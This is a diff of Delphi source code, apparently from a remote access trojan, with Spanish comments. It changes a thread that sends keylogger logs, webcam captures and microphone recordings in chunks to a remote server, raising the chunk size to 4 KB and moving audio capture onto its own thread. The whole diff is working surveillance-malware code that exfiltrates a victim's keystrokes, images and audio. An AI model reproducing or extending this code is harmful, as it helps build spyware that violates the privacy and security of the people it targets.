@@ -34,14 +34,19 @@ var
   MS : TMemoryStream;
   Enviando : array[0..5] of boolean;
   EnviandoStr : array[0..5] of string;
+  AudioInfo : TAudioInfo;  //Thread para captura de audio
+  Grabando : boolean;
+const
+  BlockSize = 1024*4;//4kb
 begin
+
   FreeOnTerminate := True;
   Enviando[0] := false;
   Enviando[1] := false;
   Enviando[2] := false;
   Enviando[3] := false;
   Enviando[4] := false;
-
+  Grabando := false;
   EnviandoStr[0] := '';
   EnviandoStr[1] := '';
   EnviandoStr[2] := '';
@@ -63,8 +68,8 @@ begin
         server.SendString('SH|'+ SH + #10 + 'KEYLOGGERLOGSTART|'+inttostr(length(EnviandoStr[4]))+'|'+ #10); //Enviamos el tamaño
       end;
 
-      TempStr := copy(EnviandoStr[4],1,1024); //Bloques de 1 kb
-      Delete(EnviandoStr[4], 1, 1024);
+      TempStr := copy(EnviandoStr[4],1,BlockSize); //Bloques de BlockSize
+      Delete(EnviandoStr[4], 1, BlockSize);
 
       if TempStr <> '' then
       begin
@@ -102,8 +107,8 @@ begin
         Enviando[0] := true;
       end;
 
-      TempStr := copy(EnviandoStr[0],1,1024); //Bloques de 1 kb
-      Delete(EnviandoStr[0], 1, 1024);
+      TempStr := copy(EnviandoStr[0],1,BlockSize); //Bloques de BlockSize
+      Delete(EnviandoStr[0], 1, BlockSize);
 
       if TempStr <> '' then
       begin
@@ -125,8 +130,8 @@ begin
         EnviandoStr[1] := CapturaWebcam;
       end;
 
-      TempStr := copy(EnviandoStr[1],1,1024); //Bloques de 1 kb
-      Delete(EnviandoStr[1], 1, 1024);
+      TempStr := copy(EnviandoStr[1],1,BlockSize); //Bloques de BlockSize
+      Delete(EnviandoStr[1], 1, BlockSize);
       server.SendString('SH|'+SH+#10+ 'WEBCAMCHUNK|'+inttostr(length(TempStr))+'|'+#10+ TempStr);    //GOGOGO
 
       if EnviandoStr[1] = '' then
@@ -178,8 +183,8 @@ begin
       else
       begin
 
-        TempStr := copy(EnviandoStr[2],1,1024); //Bloques de 1 kb
-        Delete(EnviandoStr[2], 1, 1024);
+        TempStr := copy(EnviandoStr[2],1,BlockSize); //Bloques de BlockSize
+        Delete(EnviandoStr[2], 1, BlockSize);
 
         if TempStr <> '' then
         begin
@@ -193,7 +198,16 @@ begin
       end;
     end;
 
-    if((CapturaAudio <> '') or Enviando[3])then
+    if RecordedAudio <> '' then
+    begin
+      Grabando := false;
+      Enviando[3] := true;
+      EnviandoStr[3] := RecordedAudio;
+      RecordedAudio := '';
+      server.SendString('SH|'+SH+#10+'AUDIOSTART|'+inttostr(length(EnviandoStr[3]))+'|'+ #10);
+    end;
+    
+    if((CapturaAudio <> '') or Enviando[3]) and (not grabando)then
     begin
       if not Enviando[3] then
       begin
@@ -213,27 +227,35 @@ begin
         Delete(Recibido, 1, pos('|', Recibido));
         buffer := '';
 
-        GrabaAudio(strtointdef(tempstr2,0){Dispositivo},
+          AudioInfo := TAudioInfo.Create(strtointdef(tempstr2,0){Dispositivo},
                   strtointdef(tempstr,1){Duracion en segundos},
                   strtointdef(tempstr3,11025),
                   strtointdef(tempstr1,8){bits},
-                  strtointdef(tempstr4,1){mono|stereo},
-                  EnviandoStr[3]{buffer});
-        server.SendString('SH|'+SH+#10+'AUDIOSTART|'+inttostr(length(EnviandoStr[3]))+'|'+ #10);
-        Enviando[3] := true;
+                  strtointdef(tempstr4,1){mono|stereo});
+            //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
+            
+            BeginThread(nil,
+              0,
+              Addr(StartRecording),
+              AudioInfo,
+              0,
+              AudioInfo.ThreadId);
+            Grabando := true;
       end;
-
-        TempStr := copy(EnviandoStr[3],1,1024); //Bloques de 1 kb
-        Delete(EnviandoStr[3], 1, 1024);
-
-        if TempStr <> '' then
+        if not grabando then
         begin
-          server.SendString('SH|'+SH+#10+'AUDIOCHUNK|'+inttostr(length(TempStr))+'|'+ #10+TempStr);    //GOGOGO
-        end
-        else
-        begin
-          Enviando[3] := false; //Ya hemos terminado
-          CapturaAudio := '';
+          TempStr := copy(EnviandoStr[3],1,BlockSize); //Bloques de BlockSize
+          Delete(EnviandoStr[3], 1, BlockSize);
+
+          if TempStr <> '' then
+          begin
+            server.SendString('SH|'+SH+#10+'AUDIOCHUNK|'+inttostr(length(TempStr))+'|'+ #10+TempStr);    //GOGOGO
+          end
+          else
+          begin
+            Enviando[3] := false; //Ya hemos terminado
+            CapturaAudio := '';
+          end;
         end;
     end;
   end;
